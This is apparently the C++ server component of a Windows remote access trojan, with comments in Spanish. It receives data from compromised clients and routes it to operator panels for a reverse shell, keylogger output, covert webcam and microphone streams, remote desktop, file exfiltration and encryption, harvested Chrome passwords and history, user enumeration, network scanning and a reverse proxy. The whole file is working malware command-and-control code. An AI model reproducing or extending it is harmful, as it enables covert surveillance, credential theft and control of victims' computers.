#include "server.hpp"
#include "misc.hpp"
#include "notify.hpp"
#include "frame_client.hpp"
#include "frame_remote_desktop.hpp"
#include "frame_main.hpp"
#include "panel_file_manager.hpp"
#include "panel_process_manager.hpp"
#include "panel_microfono.hpp"
#include "panel_reverse_shell.hpp"
#include "panel_keylogger.hpp"
#include "panel_camara.hpp"
#include "panel_wmanager.hpp"
#include "panel_informacion.hpp"
#include "panel_info_chrome.hpp"
#include "panel_usuarios.hpp"
#include "panel_escaner.hpp"
#include "panel_fun.hpp"
#include "panel_reverse_proxy.hpp"
#include "panel_transfer.hpp"
#include "file_editor.hpp"

//Definir el servidor globalmente
Servidor* p_Servidor;
std::mutex vector_mutex;
std::mutex count_mutex;
std::mutex list_mutex;

void Print_Packet(const Paquete& paquete) {
    std::cout << "Tipo paquete: " << paquete.uiTipoPaquete << '\n';
    std::cout << "[CHUNK]Tam buffer: " << paquete.uiTamBuffer << '\n';
    std::cout << "Ultimo: " << paquete.uiIsUltimo << '\n';
    //std::cout << "Buffer: " << paquete.cBuffer.data() << "\n";
}

bool Cliente_Handler::OpenPlayer() {
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 2;
    wfx.nSamplesPerSec = 11025;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
    wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;
    //wfx.cbSize = 0;
    // Abrir el dispositivo de reproducci�n de audio

    if (sizeof(wfx) != sizeof(WAVEFORMATEX)) {
        std::cerr << "Tama�o incorrecto de la estructura WAVEFORMATEX." << std::endl;
        return false;
    }

    // Intentar abrir el dispositivo de reproducci�n de audio
    if (waveOutOpen(&this->wo, WAVE_MAPPER, &wfx, NULL, NULL, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        std::cerr << "Error al abrir el dispositivo de reproducci�n de audio" << std::endl;
        return false;
    }
    return true;
}

void Cliente_Handler::PlayBuffer(char* pBuffer, size_t iLen){
    
    WAVEHDR header = {};
    header.dwFlags = 0;
    header.lpData = pBuffer;
    header.dwBufferLength = iLen;
     

    if (waveOutPrepareHeader(this->wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
        std::cerr << "Error al preparar el encabezado del buffer de audio" << std::endl;
        waveOutUnprepareHeader(this->wo, &header, sizeof(header));
        waveOutClose(this->wo);
        return;
    }

    if (waveOutWrite(this->wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
        std::cerr << "Error al escribir el buffer de audio en el dispositivo de reproducci�n" << std::endl;
        waveOutUnprepareHeader(this->wo, &header, sizeof(header));
        waveOutClose(this->wo);
        return;
    }

    while (waveOutUnprepareHeader(this->wo, &header, sizeof(header)) == WAVERR_STILLPLAYING) {
        // Espera un poco antes de intentar nuevamente
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

//Loop principal del thread del cliente
void Cliente_Handler::Command_Handler(){
    DWORD error_code = 0;
    int iTempRecibido = 0;
    std::vector<char> cBuffer;

    while (true) {
        if (!this->isfRunning()) {
            std::unique_lock<std::mutex> lock(this->mt_Running);
            this->iRecibido = WSA_FUNADO;
            break;
        }
        
        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, 0, true, &error_code, this->p_Cliente.c_key);
        this->SetBytesRecibidos(iTempRecibido);
        
        //timeout / nonblock
        if (error_code == WSAETIMEDOUT || error_code == WSAEWOULDBLOCK) {
            continue;
        }

        /*Desconexion del cliente
        Si no recibio nada y el error no es timeout o se cerro repentinamente*/
        if ((iTempRecibido == SOCKET_ERROR && (error_code != WSAETIMEDOUT || error_code != WSAEWOULDBLOCK)) ||
            error_code == WSAECONNRESET) {
            std::unique_lock<std::mutex> lock(this->mt_Running);
            this->iRecibido = WSA_FUNADO;
            break;
        }else if (iTempRecibido == 0) {
            continue;
        }

        //Agregar datos al queue
        if (iTempRecibido > 0) {
            struct Paquete nNuevo;
            if (p_Servidor->m_DeserializarPaquete(cBuffer.data(), nNuevo, iTempRecibido)) {
                this->Procesar_Paquete(nNuevo);
            }else {
                this->Log("No se pudo deserializar el paquete. Recibido: " + std::to_string(iTempRecibido));
            }
        }
    }

    this->Log("Done!");
}

void Cliente_Handler::Add_to_Queue(const Paquete_Queue& paquete) {
    std::unique_lock<std::mutex> lock(this->mt_Queue);
    this->queue_Comandos.push(paquete);
}

void Cliente_Handler::Procesar_Paquete(const Paquete& paquete) {
    std::vector<char>& acumulador = this->paquetes_Acumulados[paquete.uiTipoPaquete];
    size_t oldSize = acumulador.size();
    acumulador.resize(oldSize + paquete.uiTamBuffer);
    memcpy(acumulador.data() + oldSize, paquete.cBuffer.data(), paquete.uiTamBuffer);

    if(paquete.uiIsUltimo == 1){
        acumulador.push_back('\0'); //Borrar este byte al trabajar con datos binarios
        Paquete_Queue nNuevo;
        nNuevo.uiTipoPaquete = paquete.uiTipoPaquete;
        nNuevo.cBuffer.insert(nNuevo.cBuffer.begin(), acumulador.begin(), acumulador.end());

        this->Add_to_Queue(nNuevo);

        this->paquetes_Acumulados.erase(paquete.uiTipoPaquete);
    }
}

void Cliente_Handler::Process_Queue() {

    while (true) {
        
        if (!this->isfRunning() || !this->m_isQueueRunning()) {break;}

        std::unique_lock<std::mutex> lock(this->mt_Queue);

        if (!this->queue_Comandos.empty()) {
            Paquete_Queue nTemp = this->queue_Comandos.front();
            this->queue_Comandos.pop(); 
            lock.unlock();

            this->Process_Command(nTemp);
        }
    }

    std::unique_lock<std::mutex> lock(this->mt_Queue);
    while (this->queue_Comandos.size() > 0) {
        this->queue_Comandos.pop();
    }
}

//Procesar paquete completo
void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
    std::vector<std::string> vcDatos;
    int iRecibido = paquete.cBuffer.size();
    int iComando = paquete.uiTipoPaquete;

    //Pquete inicial
    if (iComando == EnumComandos::INIT_PACKET) {
        vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 7);
        if (vcDatos.size() < 7) {
            this->Log("Error procesando los datos " + std::string(paquete.cBuffer.data()));
            return;
        }
        struct Cliente structTmp;

        structTmp._strSo = this->p_Cliente._strSo = vcDatos[0];
        structTmp._strUser = this->p_Cliente._strUser = vcDatos[1];
        structTmp._strPID = this->p_Cliente._strPID = vcDatos[2];
        structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[3];
        structTmp._id = this->p_Cliente._id;
        structTmp._strIp = this->p_Cliente._strIp;
        structTmp._strListener = this->p_Cliente._strListener;
        this->p_Cliente._strRAM = vcDatos[4];
        this->p_Cliente._strIPS = vcDatos[5];

        memset(this->p_Cliente.mods, '\0', MODS_SIZE);
        memcpy_s(this->p_Cliente.mods, MODS_SIZE, vcDatos[6].c_str(), vcDatos[6].size());

        DEBUG_MSG(paquete.cBuffer.data());

        p_Servidor->m_InsertarCliente(structTmp);

        return;
    }

    //Termino la shell
    if (iComando == EnumComandos::Reverse_Shell_Finish) {
        try {
            const char* cBuff = "\r\nzero cool was here";
            this->EscribirSalidaShell(cBuff);
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //Salida de shell
    if (iComando == EnumComandos::Reverse_Shell_Salida) {
        try {
            const char* cBuff = paquete.cBuffer.data();
            this->EscribirSalidaShell(cBuff);
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //Listar directorio
    if (iComando == EnumComandos::FM_Dir_Folder) {
        try {
            ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowByName(this->p_Cliente._id + "-FM-LIST");
            if (temp_list) {
                temp_list->ListarDir(paquete.cBuffer.data());
            }
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //Listar dispositivos de almacenamiento
    if (iComando == EnumComandos::FM_Discos_Lista) {
        try {
            std::vector<std::string> vDrives = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 100);

            if (vDrives.size() > 0) {
                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowByName(this->p_Cliente._id + "-FM-LIST");
                if (temp_list) {
                    temp_list->ListarEquipo(vDrives);
                }

            }
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //Paquete inicial para descargar archivo
    if (iComando == EnumComandos::FM_Descargar_Archivo_Init) {
        vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
        if (vcDatos.size() == 2) {
            //Tama�o del archivo recibido
            u64 uTamArchivo = StrToUint(vcDatos[1].c_str());

            this->Transfers_SetTam(vcDatos[0], uTamArchivo);

            DEBUG_MSG("[ID-" + vcDatos[0] + "]Tam archivo: ");
            DEBUG_MSG(uTamArchivo);
        }
        return;
    }

    //Paquete de archivo
    if (iComando == EnumComandos::FM_Descargar_Archivo_Recibir) {
        vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
        if (vcDatos.size() == 1) {
            int iHeader = vcDatos[0].size() + 1;
            int iBytesSize = iRecibido - iHeader - 1; //1 byte del delimitador y otro del \0 agregado al procesar el paquete
            const char* cBytes = paquete.cBuffer.data() + iHeader;
            if(this->Transfers_IsAbierto(vcDatos[0])){
                this->Transfers_Write(vcDatos[0], cBytes, iBytesSize);
                this->Transfers_IncreSize(vcDatos[0], iBytesSize);
            }else {
                //this->Log("El archivo no esta abierto");
            }
        }
        return;
    }

    //Se termino la descarga del archivo
    if (iComando == EnumComandos::FM_Descargar_Archivo_End) {
        std::string strID = paquete.cBuffer.data();
        if (this->Transfers_IsAbierto(strID)) {
            this->Transfers_Close(strID);
            int index = this->Transfers_Exists(strID);
            if (index != -1) {
                TransferStatus temp_tranfers = this->Transfer_Get(index);
                u64 udiff = temp_tranfers.uTamano - temp_tranfers.uDescargado;
                if (udiff > 0) {
                    DEBUG_MSG("Error en transferencia");
                    this->Transfers_IncreSize(strID, udiff);
                }
            }else {
                DEBUG_MSG("Error en transferencia");
            }

        }
        this->Transfers_Fin(strID);
        this->Log("[!] Descarga completa");
        return;
    }

    //Paquet de editor de texto remoto
    if (iComando == EnumComandos::FM_Editar_Archivo_Paquete) {
        try {
            vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
            if (vcDatos.size() == 1) {
                //Tama�o del id del comando, id del archivo y dos back slashes
                int iHeadSize = vcDatos[0].size() + 1;
                const char* cBytes = paquete.cBuffer.data() + iHeadSize;

                wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[0]);// , this->n_Frame);
                if (temp_edit_form) {
                    temp_edit_form->AgregarTexto(cBytes);
                }
                else {
                    this->Log("No se pudo encontrar la ventana con id " + vcDatos[0]);
                }
            }
            else {
                DEBUG_MSG("No se pudo parsear el contenido de edicion remota:");
                DEBUG_MSG(paquete.cBuffer.data());
            }
        }
        catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //Confirmacion de cifrado
    if (iComando == EnumComandos::FM_Crypt_Confirm) {
        std::string strRes = paquete.cBuffer.data();
        wxString strMessage = "";
        if (strRes == "1") {
            strMessage = "[CRYPT] No se pudo abrir el archivo de entrada";
        }else if (strRes == "2") {
            strMessage = "[CRYPT] No se pudo abrir el archivo de salida";
        }else if (strRes == "3") {
            strMessage = "[CYRPT] Operacion completada";
        }

        wxMessageBox(strMessage, "Cifrado de archivos", wxOK, nullptr);
        return;
    }

    //El cliente envio la ruta actual del administrador de archivos
    if (iComando == EnumComandos::FM_CPATH) {
        try {
            panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowByName(this->p_Cliente._id + "-FM");
            if (temp_panel) {
                const char* cBuff = paquete.cBuffer.data();
                temp_panel->ActualizarRuta(cBuff);
            }
            else {
                this->Log("No se pudo encontrar panel FM activo");
            }
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //Lista de procesos remotos
    if (iComando == EnumComandos::PM_Lista) {
        try {
            panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowByName(this->p_Cliente._id + "-PM");
            if (panel_proc) {
                panel_proc->listManager->AgregarData(std::string(paquete.cBuffer.data()), this->p_Cliente._strPID);
            }
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //Log del keylogger
    if (iComando == EnumComandos::KL_Salida) {
        try {
            panelKeylogger* temp_panel = (panelKeylogger*)wxWindow::FindWindowByName(this->p_Cliente._id + "-key");
            if (temp_panel) {
                const char* cBuff = paquete.cBuffer.data();
                temp_panel->AgregarData(cBuff);
            }
            else {
                this->Log("[X] No se pudo encontrar el panel keylogger");
            }
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //mod camara - Lista de dispositivos
    if (iComando == EnumComandos::CM_Lista_Salida) {
        try {
            panelCamara* temp_panel_cam = (panelCamara*)wxWindow::FindWindowByName(this->p_Cliente._id + "-CAM");
            if (temp_panel_cam) {
                const char* cBuff = paquete.cBuffer.data();
                temp_panel_cam->ProcesarLista(cBuff);
            }
        }catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //mod camara - Buffer de video de la camara
    if (iComando == EnumComandos::CM_Single_Salida) {
        try {
            vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
            if (vcDatos.size() == 1) {
                int iHeadSize = vcDatos[0].size() + 1; //len del id del dev
                int iBuffSize = iRecibido - iHeadSize - 1;
                const char* cBytes = paquete.cBuffer.data() + iHeadSize;
                panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[0]);// , this->n_Frame);
                if (panel_picture) {
                    panel_picture->OnDrawBuffer(cBytes, iBuffSize);
                }
                else {
                    this->Log("[X] No se pudo encontrar el panel de camara");
                }
            }
        }catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //mod microfono - Lista de dispositivos
    if (iComando == EnumComandos::Mic_Refre_Resultado) {
        try {
            panelMicrophone* temp_mic_panel = (panelMicrophone*)wxWindow::FindWindowByName(this->p_Cliente._id + "-mic");
            if (temp_mic_panel) {
                const char* cBuff = paquete.cBuffer.data();
                temp_mic_panel->ProcesarLista(cBuff);
            }
            else {
                DEBUG_MSG("[MIC]No se pudo encontrar ventana activa");
            }
        }catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //mod microfono - Reproducir buffer de audio
    if (iComando == EnumComandos::Mic_Live_Packet) {
        try {
            if (this->OpenPlayer()) {
                char* cbuff = (char*)paquete.cBuffer.data();
                this->PlayBuffer(cbuff, iRecibido - 1);
                this->ClosePlayer();
            }
            else {
                this->Log("No se pudo abrir el reproductor");
            }
        }catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //mod escritorio remoto - lista monitores
    if (iComando == EnumComandos::RD_Lista_Salida) {
        try {
            frameRemoteDesktop* temp_rd_frame = (frameRemoteDesktop*)wxWindow::FindWindowByName(this->p_Cliente._id + "-RD");
            if (temp_rd_frame) {
                const char* cBuff = paquete.cBuffer.data();
                temp_rd_frame->ProcesarLista(cBuff);
            }
        }catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //mod escritorio remoto - Buffer de video del escritorio
    if (iComando == EnumComandos::RD_Salida) {
        try {
            frameRemoteDesktop* temp_rd_frame = (frameRemoteDesktop*)wxWindow::FindWindowByName(this->p_Cliente._id + "-RD");
            if (temp_rd_frame != NULL) {
                const char* cBufferImagen = paquete.cBuffer.data();
                temp_rd_frame->OnDrawBuffer(cBufferImagen, iRecibido - 1);
            }
        }catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //mod escritorio remoto - Envio de imagen parcial (pixeles)
    if (iComando == EnumComandos::RD_Salida_Pixel) {
        try{
            frameRemoteDesktop* temp_rd_frame = (frameRemoteDesktop*)wxWindow::FindWindowByName(this->p_Cliente._id + "-RD");
            if (temp_rd_frame != NULL) {
                const char* cBufferImagen = paquete.cBuffer.data();
                temp_rd_frame->ProcesaPixelData(cBufferImagen, iRecibido - 1);
            }
        }catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //mod admin ventanas - Lista de ventanas
    if (iComando == EnumComandos::WM_Lista) {
        try{
            panelWManager* temp_lv_wm = (panelWManager*)wxWindow::FindWindowByName(this->p_Cliente._id + "-WM");
            if (temp_lv_wm) {
                std::string strData(paquete.cBuffer.data());
                temp_lv_wm->AgregarData(strData);
            }
        }catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //mod informacion - Lista perfiles chrome
    if (iComando == EnumComandos::INF_Chrome_Profiles_Out) {
        try{
            panelInfoChrome* temp_pn = (panelInfoChrome*)wxWindow::FindWindowByName(this->p_Cliente._id + "-INF-CHROME");
            if (temp_pn) {
                std::string strData(paquete.cBuffer.data());
                temp_pn->m_AgregarDataPerfiles(strData);
            }
        }catch (const std::exception& e) {
            wxMessageBox(e.what(), "Exception");
        }
        return;
    }

    //mod informacion - Procesar informacion de perfil (historial/passwords/descargas)
    if (iComando == EnumComandos::INF_Chrome_Profile_Data_Out) {
        try {
            panelInfoChrome* temp_pn = (panelInfoChrome*)wxWindow::FindWindowByName(this->p_Cliente._id + "-INF-CHROME");
            if (temp_pn) {
                std::string strData(paquete.cBuffer.data());
                temp_pn->m_ProcesarInfoPerfil(strData);
            }
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //mod informacion - No se pudo obtener la informacion solicitada
    if (iComando == EnumComandos::INF_Error) {
            wxMessageBox("No se pudo obtener la informacion", "Error", 5L);
        return;
    }

    //mod informacion - Informacion de usuarios de windows
    if (iComando == EnumComandos::INF_Users) {
        try {
            panelUsuarios* temp_pn = (panelUsuarios*)wxWindow::FindWindowByName(this->p_Cliente._id + "-INF-USR");
            if (temp_pn) {
                std::string strData(paquete.cBuffer.data());
                temp_pn->m_ProcesarDatos(strData);
            }
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //mod reverse proxy
    if (iComando == EnumComandos::PROXY_CMD) {
        DEBUG_MSG("Procesando respuesta de proxy...");
        p_Servidor->modRerverseProxy->procRespuestaProxy(iRecibido-1, paquete.cBuffer);
        return;
    }

    //mod escaner red
    if (iComando == EnumComandos::Net_Scan || iComando == EnumComandos::Net_Scan_Sck || iComando == EnumComandos::Net_Scan_Syn ||
        iComando == EnumComandos::Net_Scan_Full_Syn || iComando == EnumComandos::Net_Scan_Full_Sck) {
        try {
            panelEscaner* temp_pn = (panelEscaner*)wxWindow::FindWindowByName(this->p_Cliente._id + "-NET");
            if (temp_pn) {
                temp_pn->AddData(paquete.cBuffer.data());
                //this->n_Frame->panelScaner->AddData(paquete.cBuffer.data());
            }
            else {
                DEBUG_MSG("[!] No se pudo encontrar ventana de escaner de red");
            }
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }

    //Log Remoto
    if (iComando == EnumComandos::LOG) {
        try {
            //this->n_Frame->m_AddRemoteLog(paquete.cBuffer.data());
        }
        catch (const std::exception& e) {
                wxMessageBox(e.what(), "Exception");
            }
        return;
    }
}

void Cliente_Handler::EscribirSalidaShell(const char*& cBuffer) {
    panelReverseShell* temp_shell = (panelReverseShell*)wxWindow::FindWindowByName(this->p_Cliente._id + "-shell");
    if (temp_shell) {
        temp_shell->EscribirSalida(cBuffer);
    }
    
}

void Cliente_Handler::Spawn_Threads() {
    this->p_thHilo = std::thread(&Cliente_Handler::Command_Handler, this);
    this->p_thQueue = std::thread(&Cliente_Handler::Process_Queue, this);
}

//##################################################################################
// Manipulacion de vector que almacena informacion de archivos que se estan transfiriendo
//##################################################################################
void Cliente_Handler::Transfers_Fin(const std::string& strID) {
    int iRet = this->Transfers_Exists(strID);
    if (iRet != -1) {
        std::unique_lock<std::mutex> lock(this->mt_Archivos);
        this->vcArchivos_Descarga[iRet].transfer.isDone = true;

        panelTransfer* temp = (panelTransfer*)wxWindow::FindWindowByName("TRANSFER-" + strID);
        if (temp) {
            temp->DoneOmar();
        }
    }
}

int Cliente_Handler::Transfers_Exists(const std::string& strID) {
    std::unique_lock<std::mutex> lock(this->mt_Archivos);
    for(int iNum = 0; iNum < this->vcArchivos_Descarga.size(); iNum++){
        if (this->vcArchivos_Descarga[iNum].strID == strID) {
            return iNum;
        }
    }
    DEBUG_MSG("No se encontro: " + strID);
    return -1;
}

void Cliente_Handler::Transfers_IncreSize(const std::string& strID, int iSize) {
    int iRet = this->Transfers_Exists(strID);
    if (iRet != -1) {
        std::unique_lock<std::mutex> lock(this->mt_Archivos);
        this->vcArchivos_Descarga[iRet].transfer.uDescargado += iSize;
        
        panelTransfer* temp = (panelTransfer*)wxWindow::FindWindowByName("TRANSFER-" + strID);
        if (temp) {
            temp->AgregarProgreso(this->vcArchivos_Descarga[iRet].transfer.uDescargado, this->vcArchivos_Descarga[iRet].transfer.uTamano);
        }
    }
}

void Cliente_Handler::Transfers_SetTam(const std::string& strID, u64 uTamArchivo) {
    int iRet = this->Transfers_Exists(strID);
    if (iRet != -1) {
        std::unique_lock<std::mutex> lock(this->mt_Archivos);
        this->vcArchivos_Descarga[iRet].transfer.uTamano = uTamArchivo;
    }
}

void Cliente_Handler::Transfers_Insertar(std::string& strID, Archivo_Descarga& nuevo_archivo, TransferStatus& transferencia) {
    std::unique_lock<std::mutex> lock(this->mt_Archivos);
    Entry_Archivo_Descarga nuevo_entry;
    nuevo_entry.transfer = transferencia;
    nuevo_entry.strID = strID;
    this->vcArchivos_Descarga.push_back(nuevo_entry);
    this->um_Archivos_Descarga.insert({ strID, nuevo_archivo });
}

bool Cliente_Handler::Transfers_IsAbierto(const std::string& strID) {
    int iRet = this->Transfers_Exists(strID);
    if (iRet != -1) {
        std::unique_lock<std::mutex> lock(*this->um_Archivos_Descarga[strID].mtx_file.get());
        return this->um_Archivos_Descarga[strID].ssOutFile.get()->is_open();
    }
    return false;
}

void Cliente_Handler::Transfers_Write(const std::string& strID, const char*& cBuffer, int iSize) {
    int iRet = this->Transfers_Exists(strID);
    if (iRet != -1) {
        std::unique_lock<std::mutex> lock(*this->um_Archivos_Descarga[strID].mtx_file.get());
        this->um_Archivos_Descarga[strID].ssOutFile.get()->write(cBuffer, iSize);
    }
}

void Cliente_Handler::Transfers_Close(const std::string& strID) {
    int iRet = this->Transfers_Exists(strID);
    if (iRet != -1) {
        std::unique_lock<std::mutex> lock(*this->um_Archivos_Descarga[strID].mtx_file.get());
        this->um_Archivos_Descarga[strID].ssOutFile.get()->close();
    }
}

int Cliente_Handler::Transfers_Size() {
    std::unique_lock<std::mutex> lock(this->mt_Archivos);
    return this->vcArchivos_Descarga.size();
}

TransferStatus Cliente_Handler::Transfer_Get(int index) {
    std::unique_lock<std::mutex> lock(this->mt_Archivos);
    return this->vcArchivos_Descarga[index].transfer;
}

std::vector<std::string> Cliente_Handler::vc_GetMods() {
    const char *mod_names[] = { "Shell Inversa", "Microfono", "Keylogger", "Camara",
                                    "Escritorio Remoto", "Administrador de Ventanas",
                                    "Informacion", "Escaner de Red", "Bromas",
                                    "Administrador de Archivos", "Proxy Inversa", "Admin Procesos"};
    std::vector<std::string> vcOut;
    for (size_t i = 0; i < MODS_SIZE-1; i++) {
        if (this->p_Cliente.mods[i] == '1') {
            vcOut.push_back(mod_names[i]);
        }
    }

    return vcOut;
}
//##################################################################################

//Crear el frame principal para interactuar con el cliente
void Cliente_Handler::CrearFrame(const std::string strTitle,const std::string strID) {
    return;
    //this->m_setFrameVisible(true);
    //this->n_Frame = new FrameCliente(this->p_Cliente._sckCliente, strTitle, this->p_Cliente);
    //this->n_Frame->Show(true);
}

void MyLogClass::LogThis(std::string strInput, int iType){
    time_t temp = time(0);
    struct tm *timeptr = localtime(&temp);

    std::string strLine = "";
    
    switch (iType){
        case LogType::LogMessage:
            strLine = "[-] ";
            break;
        case LogType::LogError:
            strLine = "[X] ";
            break;
        case LogType::LogWarning:
            strLine = "[!] ";
            break;
        default:
            strLine = "[-] ";
            break; 
    }
    
    strLine += "[" + std::to_string(timeptr->tm_hour);
    strLine += ":" + std::to_string(timeptr->tm_min) + ":";
    strLine += std::to_string(timeptr->tm_sec) + "]  ";
    strLine += strInput + "\n";

   // std::lock_guard<std::mutex> lock(this->log_mutex);
    if (this->p_txtCtrl != nullptr) {
        this->p_txtCtrl->AppendText(strLine);
    }

}

void Servidor::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }
}

bool Servidor::Init_Socket(SOCKET& _socket, u_int _puerto, struct sockaddr_in& _struct_listener){
    
    _socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (!_socket) {
        ERROR_EW("[Servidor::Init_Socket] No se pudo iniciar el socket");
        return false;
    }

    int iTemp = 1;
    if (setsockopt(_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&iTemp, sizeof(iTemp)) < 0) {
        ERROR_EW("[Servidor::Init_Socket] Error configurando el socket SO_REUSEADDR");
        return false;
    }

    unsigned long int iBlock = 1;
    if (ioctlsocket(_socket, FIONBIO, &iBlock) != 0) {
        ERROR_EW("[Servidor::Init_Socket] Error configurando el socket NON_BLOCK");
        return false;
    }

    _struct_listener.sin_family = AF_INET;
    _struct_listener.sin_port = htons(_puerto);
    _struct_listener.sin_addr.s_addr = INADDR_ANY;

    if (bind(_socket, (struct sockaddr*)&_struct_listener, sizeof(struct sockaddr)) == -1) {
        ERROR_EW("[Servidor::Init_Socket] Error configurando el socket BIND");
        return false;
    }

    return true;
}

void Servidor::Init_Listen(SOCKET& _socket) {
    if (_socket != INVALID_SOCKET) {
        if (listen(_socket, 10) == -1) {
            ERROR_EW("[Servidor::Init_Listen] Error configurando el socket LISTEN");
            
        }
    }
}

Servidor::Servidor(){
    WSACleanup();
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        ERROR_EW("[WSAStartup] Servidor::Servidor");
    }

    //clase para logear
    this->m_txtLog = DBG_NEW MyLogClass();

    this->Init_Key();

    this->modRerverseProxy = new ReverseProxy();
}

bool Servidor::m_Iniciar(){
   

    //TESTING
  /*  return true;

    this->sckSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if(!this->sckSocket){
        this->m_txtLog->LogThis("No se pudo crear el socket", LogType::LogError);
        return false;
    }

    int iTemp = 1;
    if(setsockopt(this->sckSocket, SOL_SOCKET, SO_REUSEADDR, (const char*)&iTemp, sizeof(iTemp)) < 0){
        this->m_txtLog->LogThis("Error configurando el socket SO_REUSEADDR", LogType::LogError);
        return false;
    }

    unsigned long int iBlock = 1;
    if(ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0){
        this->m_txtLog->LogThis("[SERVER] Error configurando el socket NON_BLOCK", LogType::LogError);
        ERROR_EW("<----");
        return false;
    }

    this->structServer.sin_family        =                    AF_INET;
    this->structServer.sin_port          = htons(this->uiPuertoLocal);
    this->structServer.sin_addr.s_addr   =                 INADDR_ANY;
    if(bind(this->sckSocket, (struct sockaddr *)&this->structServer, sizeof(struct sockaddr)) == -1){
        this->m_txtLog->LogThis("Error configurando el socket BIND", LogType::LogError);
        return false;
    }

    if(listen(this->sckSocket, 10) == -1){
        this->m_txtLog->LogThis("Error configurando el socket LISTEN", LogType::LogError);
        return false;
    }*/

    return true;
}

ClientConInfo Servidor::m_Aceptar(SOCKET& _socket){
    struct ClientConInfo structNuevo;
    struct sockaddr_in structCliente;
    int iTempC = sizeof(struct sockaddr_in);
    SOCKET tmpSck = accept(_socket, (struct sockaddr *)&structCliente, &iTempC) ;
    if(tmpSck != INVALID_SOCKET){
        char strIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(structCliente.sin_addr), strIP, INET_ADDRSTRLEN);
        std::string strTmp = "Nueva conexion de ";
        strTmp += strIP;
        strTmp +=  ":" + std::to_string(ntohs(structCliente.sin_port));
        
        this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

        //DWORD timeout = CLI_TIMEOUT_MILSECS; //100 miliseconds timeout
        //setsockopt(tmpSck, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);
        unsigned long int iBlock = 1;
        if (ioctlsocket(tmpSck, FIONBIO, &iBlock) != 0) {
            DEBUG_MSG("Error configurando el socket NON_BLOCK");
        }
        
        structNuevo._strPuerto = std::to_string(ntohs(structCliente.sin_port));
        structNuevo._sckSocket = tmpSck;
        structNuevo._strIp = strIP;
    } else {
        structNuevo._sckSocket = tmpSck;
    }
        
    return structNuevo;
}

void Servidor::m_Handler(){
    this->p_Escuchando = true;

    this->thListener = std::thread(&Servidor::m_Escucha, this);
    this->thCleanVC = std::thread(&Servidor::m_CleanVector, this);
}

void Servidor::m_JoinThreads() {
    if (this->thCleanVC.joinable()) {
        this->thCleanVC.join();
    }

    if (this->thListener.joinable()) {
        this->thListener.join();
    }

    this->m_txtLog->LogThis("Thread LISTENER terminada", LogType::LogMessage);
}

void Servidor::m_StopHandler() {
    this->m_txtLog->LogThis("Apagando", LogType::LogError);
    std::lock_guard<std::mutex> lock(this->p_mutex);
    this->p_Escuchando = false;
    m_CerrarConexion(this->sckSocket);
}

void Servidor::m_CerrarConexion(SOCKET pSocket) {
    if (pSocket != INVALID_SOCKET) {
        DEBUG_MSG("Cerrando socket:"); DEBUG_MSG(pSocket);
        closesocket(pSocket);
        pSocket = INVALID_SOCKET;
    }
}

